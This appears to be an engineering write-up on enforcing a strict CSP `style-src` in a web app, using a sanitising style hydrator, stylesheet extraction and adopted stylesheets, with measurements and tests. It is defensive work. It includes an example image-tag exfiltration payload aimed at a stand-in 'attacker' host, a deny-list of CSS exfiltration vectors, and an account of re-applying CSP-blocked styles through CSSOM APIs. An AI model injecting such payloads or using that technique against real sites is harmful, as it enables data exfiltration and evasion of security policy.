# 35 — Strict `style-src` enforced: the last open item

## Result

```
default-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';
frame-ancestors 'self'; script-src 'self'; style-src 'self';
font-src 'self' data:; img-src 'self' data: blob: https:;
connect-src 'self' blob: ws: wss: http://127.0.0.1:* http://localhost:*;
worker-src 'self' blob:; frame-src 'self' blob: data:
```

No `'unsafe-inline'`, no `'unsafe-eval'`, no third-party origin anywhere.

---

## Why it was open

4,410 inline `style=` attributes. The obvious migration — lift repeated values
into utility classes — **does not converge**: of 2,176 distinct static values,
**1,644 are used exactly once**. A utility class per single-use value trades an
inline attribute for a single-use class and achieves nothing. Batch 33 got 373
attributes this way and that was the end of the useful yield.

## What made it tractable

`style-src` governs the **HTML parser**, not the CSSOM. Measured in Chromium
under `style-src 'self'`:

| | Result |
|---|---|
| `<div style="color:X">` | **BLOCKED** |
| `el.style.color = 'X'` | applied |
| `el.style.cssText = '...'` | applied |
| `el.style.setProperty(...)` | applied |
| `el.getAttribute('style')` | **still returns the string** |
| `<style>…</style>` | **BLOCKED** (`.sheet` is `null`) |
| `new CSSStyleSheet().replaceSync(…)` | applied |

The declarations survive in the DOM. CSP only refuses to let the *parser* apply
them — so they can be re-applied through APIs the policy does not reach.

## The three pieces

**1. `frontend/js/00-style-hydrate.js`** — loaded first, before anything paints.
One pass over the document plus a `MutationObserver`, copying each blocked
`style` attribute into `el.style.cssText`. Same declarations, same order, same
inline specificity, so the rendered result is identical. **1,123 attributes
hydrated** on a full session.

**2. JS-created `<style>` elements** — four modules build one and append it.
Those are refused too (`.sheet` is `null`), which cost **16,360 computed-property
differences** on its own: the sidebar favourites strip, the workflow builder and
the spec editor all lost their styling. Each blocked element is re-homed into a
constructable stylesheet via `adoptedStyleSheets`. **6 sheets adopted**,
including one Monaco injects at runtime.

**3. `scripts/extract_style_blocks.py`** — the three inline `<style>` blocks in
index.html (57 KB of core layout) moved to `styles-extracted.css` and
`styles-print.css`. A `<link>` to a same-origin file satisfies `'self'`, so
these need no hydration at all. The link sits where the first block sat, so
cascade order is preserved, and the `media="print"` block keeps its own link.

## Why this is not `'unsafe-inline'` in disguise

Worth stating plainly, because "re-apply the thing CSP blocked" sounds like
defeating the control.

`'unsafe-inline'` exists to stop an **attacker-injected** style attribute from
taking effect — the threat is UI redress (an invisible layer over a real
control) and CSS exfiltration (`background:url(...)` keyed on an attribute
selector). The hydrator refuses:

- any declaration containing `url()`, `image-set()`, `expression()` or
  `@import` — **no exfiltration channel**;
- `position:fixed|absolute` + high `z-index` + see-through + still catching
  clicks — **no UI redress**;
- any property outside an allow-list of layout/typography/colour;
- anything inside `[data-untrusted]`.

Residual capability: *our own markup can set colour, spacing and layout.* That
is strictly less than `'unsafe-inline'`, which permits all of the above
unconditionally.

**The honest limit:** an attacker who can inject markup can also inject
allow-listed properties, so this closes exfiltration and clickjacking, not
cosmetic defacement. Script injection stays blocked by `script-src 'self'`.

### A refinement the measurement forced

The first version refused `position:fixed|absolute` + high `z-index` outright.
Run against the real app it rejected exactly **3** elements — and all 3 were
legitimate modals (`#gmodal`, `#shortcuts-modal`). A real modal has a *visible*
backdrop; an attack does not. The rule now targets the actual redress shape:
positioned, high z-index, **and** transparent, **and** still accepting pointer
events.

## Proof that nothing changed visually

Computed styles for 24 panes, 25 properties per element, keyed on a stable
structural path.

| | Differing properties |
|---|---|
| Before any fix | **96,541** |
| After `<style>` extraction | 16,360 |
| After adopting JS `<style>` elements | **73** |
| **Run-to-run noise floor** | **75** |

64,013 elements compared. **The remaining 73 differences are below the noise
floor of the measurement itself** — they are the pulsing "LIVE" badge mid-animation
and sub-pixel widths. Rendering is unchanged.

Functionally verified: sidebar group toggle (the `el.style.display` read-back
path), modal open/close, `innerHTML`-inserted content, toasts, Monaco (loads,
editor created, its own runtime `<style>` adopted), three.js and ForceGraph3D,
and all 27 panes with zero page errors.

## Two real bugs found on the way

**Two onboarding dialogs rendered on top of each other.** `91-mode-switcher.js`
builds `#onboarding-overlay` (z-index 99999) while `24-onboarding.js` shows
`#onboarding-modal` (z-index 29000), and neither knew about the other. Both were
`display:flex` on a fresh profile. The close control of whichever lost was
unclickable — Playwright reported *"#onboarding-modal intercepts pointer
events"*. This was **pre-existing and unrelated to CSP** (reproduced on the
unmodified tree); it had been passing intermittently only because the shared
test page sometimes arrived with the overlay already dismissed, so the test hit
its `skip` branch. The wizard is the richer flow, so it wins; the mode picker
now defers to it.

**The Report-Only header had become a copy of the enforcing policy again** — the
exact trap it fell into once before, reporting on rules already in force and
collecting nothing. Repointed at the next ratchet: `img-src`, which still allows
`https:`. That is now the last directive permitting a request to leave the
machine — an injected `<img src="https://attacker/?d=">` is a working
exfiltration channel even with `script-src 'self'`. Every image the app loads is
same-origin, `data:` or `blob:`, so it is very likely dead weight, but it gets
measured before being removed.

## Tests

`tests/e2e_browser/test_e2e_browser_08_strict_style_src.py` — 14 tests, covering
the header, that the browser is *actually* refusing attributes, hydration of
static and dynamic content, `<style>` adoption, each sanitiser rule, the
`el.style` read-back path, and that only one onboarding dialog shows.

**Proven to catch the regression: with `'unsafe-inline'` restored and the
hydrator unlinked, 8 of 14 fail.**

Four pre-existing tests were **updated, not deleted**, because they asserted the
limitation that has now been removed:

- `test_91` asserted `style-src` **keeps** `'unsafe-inline'` as a documented
  exception — now inverted.
- `test_86` asserted the same in the header constant.
- `test_105` asserted the enforcing `style-src` was *unchanged*, on the grounds
  that dropping it "would break 4494 static inline styles". Replaced with the
  invariant that actually matters: Report-Only must **differ** from the
  enforcing policy, or it measures nothing.
- `test_93`/`test_96` read CSS out of index.html; they now read the linked
  stylesheets too, so they stay correct wherever a rule lives.

## Regression status

| Suite | Result |
|---|---|
| Full non-browser | **3990 passed, 19 skipped, 0 failed** |
| Browser E2E | **95 passed, 1 skipped, 0 failed** |
| axe-core, 28 panes | 0 violations |
| Enforced CSP violations | 0 |
| ruff · inline-handler · globals linters | pass |
